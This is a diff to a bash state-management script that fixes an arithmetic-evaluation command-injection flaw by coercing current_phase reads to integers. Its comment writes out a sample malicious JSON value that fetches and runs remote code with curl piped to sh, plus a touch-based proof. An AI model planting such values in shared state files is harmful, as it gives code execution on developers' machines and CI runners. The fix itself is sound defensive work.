@@ -60,6 +60,34 @@ HUMAN_HOURLY_RATE_USD="${EDM_HUMAN_HOURLY_RATE_USD:-${CLAUDE_PLUGIN_OPTION_HUMAN
 
 die() { echo "edm-state: $*" >&2; exit 1; }
 
+# to_int <value> [default] -- echo <value> when it is a bare non-negative integer, else <default>
+# (0 if omitted). Every value read out of .edm-state.json that reaches an arithmetic context MUST
+# pass through here first.
+#
+# Why this exists: bash's arithmetic evaluation -- `[[ x -ge y ]]`, `(( ))`, `${a[expr]}` -- does
+# NOT treat its operands as data. It recursively expands them, and an array subscript inside an
+# operand is itself arithmetic-evaluated, which performs command substitution. So a state file
+# containing
+#     "current_phase": "a[$(curl -s http://host/p | sh)]"
+# executes that pipeline the moment the value reaches `[[ "$phase" -ge 1 ]]`. Confirmed on
+# bash 3.2.57: `x='a[$(touch /tmp/proof)]'; [[ "$x" -ge 1 ]]` creates the file.
+#
+# That is reachable with no user action. `.edm-state.json` is a committed, shared artifact by
+# design (see CLAUDE.md, "State is in the project, not the plugin"), the SessionStart hook runs
+# `edm-state session-start` on every session, and it globs every state file under the SRD root.
+# Cloning or pulling a repository is enough. The blocking `test:state-validate` CI job reaches the
+# same sinks via `edm-state validate`, so a merge request touching only a JSON data file would get
+# code execution as the runner user.
+#
+# cmd_set validates these fields on WRITE; nothing validated them on READ, and a state file can
+# arrive from git, a merge conflict, or a hand edit without ever passing through cmd_set.
+to_int() {
+  case "${1:-}" in
+    ''|*[!0-9]*) printf '%s' "${2:-0}" ;;
+    *)           printf '%s' "$1" ;;
+  esac
+}
+
 # print_help <script-path> -- prints everything between the EDM-HELP-BEGIN/EDM-HELP-END sentinel
 # comment lines near the top of <script-path> (EDMV3-T61 AC1). awk, not a hardcoded `sed -n
 # 'A,Bp'` line range: a hardcoded range silently stops covering new subcommand doc lines added
@@ -852,7 +880,7 @@ state_anomalies() {
   # is "Unknown" and current_phase >= 2. Suppressed for fast-track/fix-pack lifecycle
   # modes where size estimation is N/A.
   local phase size lifecycle_mode_anom
-  phase="$(echo "$state" | jq -r '.current_phase // 0')"
+  phase="$(echo "$state" | jq -r '(.current_phase // 0) | if type == "number" then floor else 0 end')"
   size="$(echo "$state" | jq -r '.estimated_size // "Unknown"')"
   lifecycle_mode_anom="$(echo "$state" | jq -r '.lifecycle_mode // "standard"')"
   if [[ "$size" == "Unknown" && "$phase" -ge 2 \
@@ -1230,7 +1258,7 @@ cmd_list() {
     found=1
     local prefix phase gates last product description
     prefix="$(jq -r '.prefix // "unknown"' "$state" 2>/dev/null || echo unknown)"
-    phase="$(jq -r '.current_phase // 0' "$state" 2>/dev/null || echo 0)"
+    phase="$(jq -r '(.current_phase // 0) | if type == "number" then floor else 0 end' "$state" 2>/dev/null || echo 0)"
     gates="$(jq -r '.gates_approved | length' "$state" 2>/dev/null || echo 0)"
     last="$(jq -r '.last_updated // "unknown"' "$state" 2>/dev/null || echo unknown)"
     product="$(jq -r '.product_name // ""' "$state" 2>/dev/null || true)"
@@ -1767,7 +1795,7 @@ cmd_migrate_schema() {
 
   # ---- Diagnostic report, printed before any confirmation is requested (AC1) -------------
   local current_phase gates_count terminal_phase_ms terminal_completed_at
-  current_phase="$(echo "$state" | jq -r '.current_phase // 0')"
+  current_phase="$(echo "$state" | jq -r '(.current_phase // 0) | if type == "number" then floor else 0 end')"
   gates_count="$(echo "$state" | jq -r '(.gates_approved // []) | length')"
   # Mode-derived terminal phase when mode is recorded; falls back to current_phase for a
   # pre-mode-field legacy file so the report still shows something meaningful rather than
@@ -1928,7 +1956,7 @@ cmd_archive() {
         # ---- AC1b: current_phase equals the mode-derived terminal phase, never hardcoded --
         local terminal_phase_arch current_phase_arch
         terminal_phase_arch="$(terminal_phase_for_mode "$mode" "$lifecycle_mode")"
-        current_phase_arch="$(echo "$state_json" | jq -r '.current_phase // 0')"
+        current_phase_arch="$(echo "$state_json" | jq -r '(.current_phase // 0) | if type == "number" then floor else 0 end')"
         [[ "$current_phase_arch" == "$terminal_phase_arch" ]] \
           || die "archive refused: current_phase (${current_phase_arch}) has not reached the terminal phase (${terminal_phase_arch}) for ${prefix} (mode=${mode})"
 
@@ -2446,7 +2474,7 @@ cmd_active_initiatives() {
   local found=0
   while IFS= read -r state; do
     local phase
-    phase="$(jq -r '.current_phase // 0' "$state" 2>/dev/null || echo 0)"
+    phase="$(jq -r '(.current_phase // 0) | if type == "number" then floor else 0 end' "$state" 2>/dev/null || echo 0)"
     if [[ "$phase" -ge 1 && "$phase" -le 6 ]]; then
       found=1
       local prefix last
@@ -2715,7 +2743,7 @@ cmd_session_start() {
     [[ -f "$state" ]] || continue
     local prefix phase
     prefix="$(jq -r '.prefix // "unknown"' "$state" 2>/dev/null || echo unknown)"
-    phase="$(jq -r '.current_phase // 0' "$state" 2>/dev/null || echo 0)"
+    phase="$(jq -r '(.current_phase // 0) | if type == "number" then floor else 0 end' "$state" 2>/dev/null || echo 0)"
     # De-duplicate by prefix (both layouts may resolve to the same initiative).
     local already=0
     local seen
@@ -3621,7 +3649,7 @@ write_handoff_internal() {
   state="$(cat "$state_file")"
 
   local phase
-  phase="$(echo "$state" | jq -r '.current_phase // 0')"
+  phase="$(echo "$state" | jq -r '(.current_phase // 0) | if type == "number" then floor else 0 end')"
 
   local phase_name
   phase_name="$(phase_name_for "$phase")"
